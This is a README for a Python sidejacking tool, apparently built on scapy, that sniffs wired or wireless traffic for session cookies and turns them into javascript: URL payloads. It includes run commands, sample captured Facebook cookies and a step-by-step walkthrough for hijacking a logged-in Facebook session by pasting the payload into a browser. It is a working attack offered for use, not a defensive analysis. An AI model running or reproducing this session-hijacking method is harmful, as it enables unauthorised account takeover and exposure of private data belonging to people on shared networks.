# A Simple sidejacking tool, using javascript cookie injection.

This software sniffs any interface for cookies, and generates javascript code that can be injected into any browser, by pasting it into the URL bar.

It comes accompanied by a script: `OSx10.6_monitorMode.py`, that is able to use the `airport sniff` feature present in OS X 10.6+, allowing the wireless device to be put in monitor mode. We are, thus, able to retrieve any cookie sent on the chosen wireless channel.

# Usage

To run the cookieJsInjection open a shell (e.g., bash) and execute the following command (cookieJsInjection requires scapy to run - http://www.secdev.org/projects/scapy/):

`./cookieJsInjection.py IFACE`

Where `IFACE` represents the network interface you wish to sniff on (e.g. eth0, wlan0, etc). 

If you supply the flag `-facebook`, it will only output facebook cookies, keeping track of the profiles captured in the session, and eliminating duplicate entries:

`./cookieJsInjection.py IFACE -facebook`

If you wish to run `cookieJsInjection` on a wireless device, and you are currently running OS X 10.6+, use `OSx10.6_monitorMode.py`:

    hybrid:py-cookieJsInjection diogomonica$ sudo python OSx10.6_monitorMode.py 9 -facebook
    [*] Starting scan on channel 9
    Capturing 802.11 frames on en1.
    # Found cookie for facebook user XXXXXXXX:
    c_user = XXXXXXXXX
    presence = DJ294237494BchADhA_2256.channel_22BsubA_5b1_5dBF294237772227WMblcMshfPBbloMbvtMctP294232437BsbPBtA_5b_5dBfAnullBuctMsA0QBblADacA69V294236729Z292BlcPBuoAD1454092337ADolA-1BflA_5b_5dBexpP294237495196QB1259338588ADolA-1BflA_5b_5dBexpZ295237551044QQBalAD1606900057ADiA0QQQQ
    xs = 24e156ef2ddf6d6911422b0a9825825f
    datr = 4VToPPIw60lKSa3qrFSFrlm1
    lu = ZBj64Z92UpiasQNnWbkzW32w
    sct = 1273830123
    x-referer = http%3A%2F%2Fwww.facebook.com%2F%3Fref%3Dlogo%23%2Fdiogo.monica%2Fposts%2F488456769644%3Fnotif_t%3Dfeed_comment
    [*] Javascript Injection code:
    javascript:void(document.cookie="c_user=XXXXXXXXX");void(document.cookie="wd=1280x840");void(document.cookie="e=n");void(document.cookie="presence=DJ294237494BchADhA_2256.channel_22BsubA_5b1_5dBF29432172227WMblcMsndPBbloMbvtMctP2943212437BsbPBtA_5b_5dBfAnullBuctMsA0QBblADacA69V294236729Z292BlcPBuoAD1454092337ADolA-1BflA_5b_5dBexpP29443432196QB1259338588ADolA-1BflA_5b_5dBexpP2942321553944QQBalAD1605400057ADiA0QQQQ");void(document.cookie="xs=54e156e028df6d6916232b0a9825825e");void(document.cookie="datr=1VTuTPOwDSg6xl3qrQFDrlm4");void(document.cookie="lu=TAj64Z02UpiSdFQNnWbkz2w");void(document.cookie="sct=1294230653");void(document.cookie="x-referer=http%3A%2F%2Fwww.facebook.com%2F%3Fref%3Dlogo%23%2Fdiogo.monica%2Fposts%2F488432169644%3Fnotif_t%3Dfeed_comment");

Remember to select the appropriate channel (in the example above, channel 9 was used).

# Example of Facebook sidejacking


1 - Run cookieJsInjection and wait for cookies to appear

    glow:py-cookieJsInjection hiperion$ sudo python cookieJsInjection.py en1 -facebook
    ... javascript:void(document.cookie="c_user=XXXXXXXXXX");void(document.cookie="wd=1280x616");void(document.cookie="presence=DJ293759043BchADhA_2256.channel_22BsubA_5b1_2c1LXXXXXXXXA5BF293757419186WMblcMsndPBbloMbvtMctMsbPBtA_5b_5dBfAnullBuctMsA0QBblADacA42V293758371Z416BlcA0AQ");void(document.cookie="cur_max_lag=20");void(document.cookie="act=1293757438495%2F1");void(document.cookie="L=20");void(document.cookie="datr=0fMcTTMFZZVhFiOJZvvO1pyO");void(document.cookie="locale=en_US");void(document.cookie="lu=TA3UCsI0Y6ezY6wydClUpeDw");void(document.cookie="sct=1293787415");void(document.cookie="W=1293757115");void(document.cookie="sid=3");void(document.cookie="xs=1e4d54055dbe34976a93d3a1fe574a19");void(document.cookie="x-referer=http%3A%2F%2Fwww.facebook.com%2F%23%2F");void(document.cookie="made_write_conn=1293751415");

2 - Copy the javascript code (begining with `javascript:`).

3 - Open the browser in facebook.com (make sure you are logged out of any accounts).

4 - Paste the javascript code into the URL bar (press enter)

5 - Go to facebook.com
                                       
#Background

More information on sidejacking - http://en.wikipedia.org/wiki/Session_hijacking